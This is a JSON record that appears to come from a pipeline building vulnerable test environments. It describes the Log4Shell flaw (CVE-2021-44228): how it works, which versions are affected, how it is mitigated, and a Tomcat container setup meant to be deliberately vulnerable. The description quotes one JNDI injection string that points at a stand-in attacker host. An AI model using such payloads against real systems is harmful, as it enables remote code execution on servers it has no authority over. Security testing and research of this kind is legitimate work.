{
    "desc": "CVE-2021-44228 (widely known as Log4Shell) is a critical flaw in Apache Log4j 2\u2019s core component that allows untrusted data, when logged by a vulnerable application, to trigger Java Naming and Directory Interface (JNDI) lookups and load attacker-controlled content. The root cause is Log4j 2\u2019s message lookup and JNDI lookup features, which evaluate expressions embedded in log messages and parameters (for example, strings like ${jndi:ldap://attacker.example/a}). When such a string is processed by the JndiLookup plugin, Log4j will perform an outbound connection (commonly via LDAP, but also RMI or other JNDI protocols) to a directory server under the attacker\u2019s control. That server can respond with references that cause the vulnerable system to fetch and instantiate a remote Java class (often via LDAP/HTTP). This sequence yields execution of attacker-supplied bytecode within the target process. The vulnerability affects applications that include log4j-core and log user-influenced input, which was extremely common across internet-facing and internal services. Typical injection points include HTTP request elements such as the URL path, query parameters, headers (User-Agent, Referer, Cookie), and form fields, as well as any other text that an application logs. Key preconditions are: (1) the application uses a vulnerable Log4j 2 version; (2) JNDI lookups are available; (3) the application logs attacker-controlled data; and (4) the host can make outbound network connections to attacker infrastructure. According to authoritative sources (NVD/MITRE and multiple vendor analyses), affected Log4j 2 ranges include 2.0-beta9 through 2.14.1, and also 2.15.0-rc1 and 2.15.0 under certain configurations; NVD later clarified the affected set as 2.0-beta9\u20132.15.0 except for backported fixed lines 2.12.2, 2.12.3, and 2.3.1. Successful exploitation results in unauthenticated arbitrary code execution on the server process. Immediate mitigations included upgrading to versions where the dangerous functionality is disabled or removed (2.16.0+ and ultimately 2.17.1 for comprehensive fixes), removing the JndiLookup class from the Log4j JAR, setting configuration flags to disable lookups, and restricting egress to protocols like LDAP and RMI to impede the callback stage.",
    "attack_type": "unauthenticated remote code execution via JNDI-based deserialization and remote class loading triggered by logged input",
    "services": [
        {
            "name": "tomcat",
            "version": [
                "9.0.56-jdk11-temurin"
            ],
            "dependency_type": "HARD",
            "description": "Java web application container that hosts the vulnerable application. To be actually vulnerable to CVE-2021-44228, the webapp you deploy inside this Tomcat service must include log4j-core at one of the vulnerable versions and must log attacker-controlled input. Vulnerable Log4j 2 versions (from NVD/MITRE and major vendor analyses) include: 2.0-beta9\u20142.12.1, 2.13.0\u20142.14.1, 2.15.0-rc1, and 2.15.0 (NVD further notes 2.0-beta9\u20142.15.0 except 2.12.2, 2.12.3, 2.3.1). Tomcat itself is not the vulnerable component; it provides the minimal, testable HTTP surface so a Log4j-using application can receive and log inputs. This single service is sufficient to build a working Docker setup that is vulnerable when the packaged application uses one of the affected log4j-core versions."
        }
    ],
    "input_tokens": 22483,
    "output_tokens": 2907,
    "query": "CVE-2021-44228 Log4Shell Apache Log4j vulnerability details mitigation detection exploitation impact affected versions CVSS timeline"
}